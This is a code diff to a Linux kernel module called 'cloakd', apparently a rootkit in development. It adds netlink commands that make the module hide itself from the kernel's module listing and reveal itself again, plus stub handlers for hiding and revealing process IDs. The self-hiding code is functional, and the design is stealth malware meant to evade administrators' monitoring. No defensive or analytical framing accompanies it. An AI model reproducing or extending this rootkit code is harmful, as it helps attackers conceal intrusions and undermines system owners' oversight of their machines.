@@ -28,6 +28,11 @@ struct netlink_kernel_cfg nl_kern_cfg = {
     .input = nl_recv_cmd,
 };
 
+static pid_t get_pid_from_payload(const u8* const payload)
+{
+	return (pid_t)((payload[1] << 24) + (payload[2] << 16) + (payload[3] << 8) + payload[4]);
+}
+
 static void hide_itself(void)
 {
     if (params.hidden)
@@ -43,7 +48,7 @@ static void hide_itself(void)
     params.hidden = true;
     printk(KERN_INFO "cloakd is hidden\n");
 }
-/*
+
 static void reveal_itself(void)
 {
     if (!params.hidden)
@@ -53,7 +58,16 @@ static void reveal_itself(void)
     kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "cloakd");
     params.hidden = false;
 }
-*/
+
+static void hide_pid(pid_t pid)
+{
+	printk(KERN_INFO "cloakd: hiding pid [%d]\n", pid);
+}
+
+static void reveal_pid(pid_t pid)
+{
+	printk(KERN_INFO "cloakd: revealing pid [%d]\n", pid);
+}
 
 static void process_payload(const u8 *payload)
 {
@@ -63,12 +77,15 @@ static void process_payload(const u8 *payload)
         return;
 
     cmd = payload[0];
+	printk(KERN_INFO "cloakd: recieved command=0x%x\n", cmd);
 
     switch (cmd)
     {
-        //default:    return;
-        default:    printk(KERN_INFO "cloakd: unknown command=0x%x\n", cmd); break;  
-        case 0x01:  printk(KERN_INFO "cloakd: command=0x%x\n", cmd); break;  
+        default:    		printk(KERN_INFO "cloakd: unknown command=0x%x\n", cmd); break;  
+		case HIDE_ITSELF:   hide_itself(); 		break;  
+		case REVEAL_ITSELF:	reveal_itself(); 	break;
+		case HIDE_PID:		hide_pid(get_pid_from_payload(payload)); 	break;
+		case REVEAL_PID: 	reveal_pid(get_pid_from_payload(payload)); 	break;
     }
 }
 
